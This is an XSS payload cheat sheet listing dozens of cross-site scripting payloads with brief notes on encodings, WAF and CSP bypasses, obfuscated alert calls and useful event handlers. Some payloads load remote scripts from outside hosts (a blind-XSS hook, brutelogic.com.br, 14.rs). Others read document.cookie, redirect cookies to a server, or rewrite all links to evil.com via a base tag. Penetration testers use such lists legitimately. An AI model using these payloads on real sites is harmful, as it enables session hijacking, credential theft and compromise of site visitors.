XSS
%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E                       For ASP Encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E                                       double url enc
&lt![CDATA[&lt]]&gtscript&lt![CDATA[&gt]]&gtalert('xss')&lt![CDATA[&lt]]&gt/script&lt![CDATA[&gt]]&gt    XML Reflectionxss
"onauxclick=alert(1);//
javascript://%250aalert(1)									  where :// is required after protocol
"\"&gt&lts&gttest"@gmail.com															   XSS in email id
javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));
&ltscript&gteval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));&lt/script&gt
&ltimG/sRc=l oNerrOr=(prompt)() x&gt
"&gt&ltscript src=https://a007.xss.ht&gt&lt/script&gt											Blind 
&ltbody onpageshow=alert(1)&gt
&ltstyle onload=alert(1)&gt
&ltmarquee behavior="alternate" onstart=alert(1)&gthack the planet&lt/marquee&gt
&ltd3"&lt"/onclick="1&gt[confirm``]"&lt"&gtz
&lt;script&gt;confirm(1)&lt;/script&gt;                                              HTML Encoding
“=””’&gt&lt/&gt&ltscript&gt&lt/script&gt&ltsvg onload=alert(1)&gt
&ltscript&gtvar xss = '';f=document.forms;for(i=0;i&ltf.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';&lt/script&gt    GET Hidden Fields
&lttable&gt&ltthead style=font-size:100px onmouseover=prompt(1)&gt&lttd&gtXSS
&ltsvg/x="&gt"/onload=confirm()//
&ltsCript x&gt(((confirm)))``&lt/scRipt x&gt
&ltsvg &lt/onload ="1&gt (_=prompt,_(1)) ""&gt
&lt!'/*"/*/'/*/"/*--&gt&lt/Script&gt&ltImage SrcSet=K */; OnError=confirm`1` //&gt
&ltw="/x="y&gt"/ondblclick=`&lt`[confir\u006d``]&gtXXS
"&gt&ltscript/x&gtalert(1)&lt/script/x&gt
&ltw="/x="y&gt"/ondblclick=`&lt`[confir\u006d``]&gtclick
"&gt&lt!--&ltiMg sRc=--&gt&ltimg src=x oNERror=(prompt)`1` x&gt"
"&gt&ltdeTails oNToggle=confi\u0072m(1)&gt"
&ltscript&gtfunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();&lt/script&gt   			   Get response back to server
&ltA/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x&gtXSS
data:,alert(1)
\'-alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
"&gt&ltscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt&lt/script&gt                                          (CSP bypass if http://ajax.googleapis.com is whitelisted)
"&gt&ltembed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always&gt   (CSP bypass if http://ajax.googleapis.com is whitelisted)
&ltscript src=data:,alert(1)&gt                                   when closing script tag is somewere 
&ltx:script xmlns:x="http://www.w3.org/1999/xhtml"&gtalert(1)&lt/x:script&gt               xss in xml page
&ltx:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/&gt
{{constructor.constructor('alert(1)')()}} 
&ltx ng-app&gt{{constructor.constructor('alert(1)')()}}   			                        angular JS
&ltSCRIPT SRC=//BRUTELOGIC.COM.BR/1&gt&lt/SCRIPT&gt                                             upper case
&ltSVG ONLOAD=&#97&#108&#101&#114&#116(1)&gt                                                upper case
data:text/html,&ltsvg onload=alert(1)&gt
&lta/href=//0&gt shortest link injection
"\"&gt&ltsCriPt sRc=//14.rs&gt"
&ltk onsubmit=alert(1)&gt                                                              before form tag
&ltk oninput=alert(1)&gt
foobar"/%0D&ltbody='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//
&ltscript ~~~&gtconfirm(1)&lt/script ~~~&gt
  &ltsvg/onload=alert(cookie)&gt
window+=valueOf=alert(1)
[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//
&ltscript&gt([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)&lt/script&gt
&ltscript&gt([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')``&lt/script&gt
"&gt&ltsvG oNLoad=confirm&#x28;1&#x29&gt   									when () and `` not working
&ltscript&gtthis[Object["keys"](this)[6]](1)&lt/script&gt
&ltsvgonload=alert(1)&gt		
&ltxss/ondblclick=[cookie].some(alert)&gtXSS													   	  space bypass
accesskey="X" onclick="alert(1)"													  Hidden Field
&ltsvg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
&ltscript&gtonerror=alert;throw document.domain;&lt/script&gt  
javascript:void(a='//127.0.0.1');void(b=document.domain);void(c=a.concat(b));void(window.location.assign(c));                                               Cookie stealing with javascript protocol
&ltbase href=//evil.com&gt     										change all hyper link to evil.com
&ltx onpointerenter=alert()&gtXSS		                                       onmouseover alternative
-alert(1)//\       (quoteless xss inside js context when param is refelcting 2 times in same line)
&lthtml ontouchstart=alert(1)&gtXSS          										Mobile browser XSS
&lth1/ondrag=confirm(1)&gtDragMe&lt/h1&gt
&ltsvg onload=setInterval`alert\x28document.domain\x29`&gt
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')() 										   				          Alert alternatives
(alert)(1)
a=alert,a(1)	
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
&ltsvg/onload=innerHTML=location.hash&gt #&ltimg/src/onerror=alert(1)&gt
'"&lt/Script&gt&ltHtml /Onmouseover=(alert)(1) //
&ltsvg onload=alert&lpar;1&rpar;&gt
&ltsvg onload=alert&#x28;1&#x29&gt
&ltsvg onload=alert&#40;1&#41&gt
&ltsvg onload=setInterval`alert\x28document.domain\x29`&gt
"&gt&ltinput type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"&gt
&ltbody onpageshow=alert(1)&gt
&ltbody onfocus=alert(1)&gt
" onfocus=alert(1) autofocus													auto trigger
&ltmarquee/onstart=alert()&gt
&ltobject data=javascript:alert(1)&gt
&ltMETA HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt
&ltEMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt&lt/EMBED&gt
&ltIFRAME SRC="javascript:alert('XSS');"&gt&lt/IFRAME&gt
%253cscript%253ealert(document.cookie)%253c/script%253e
&ltaudio/onloadstart=alert(1) src&gt
%u0025%u0075%u0066%u0066%u0031%u0063%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065%u0061%u006c%u0065%u0072%u0074%u0028%u0018%u0058%u0053%u0053%u0019%u0029%u003b%u0025%u0075%u0066%u0066%u0031%u0063%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065
%uff1cscript%uff1ealert(1);%uff1c/script%uff1e					
&ltdETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt                            akamai ghost wafbypass
------------------------------------------------------------------------------------------------
Events :
onxxxx
onauxclick
ondblclick
oncontextmenu
onpageshow
onpointerenter
onloadstart
ontouchstart

Reference 
https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/

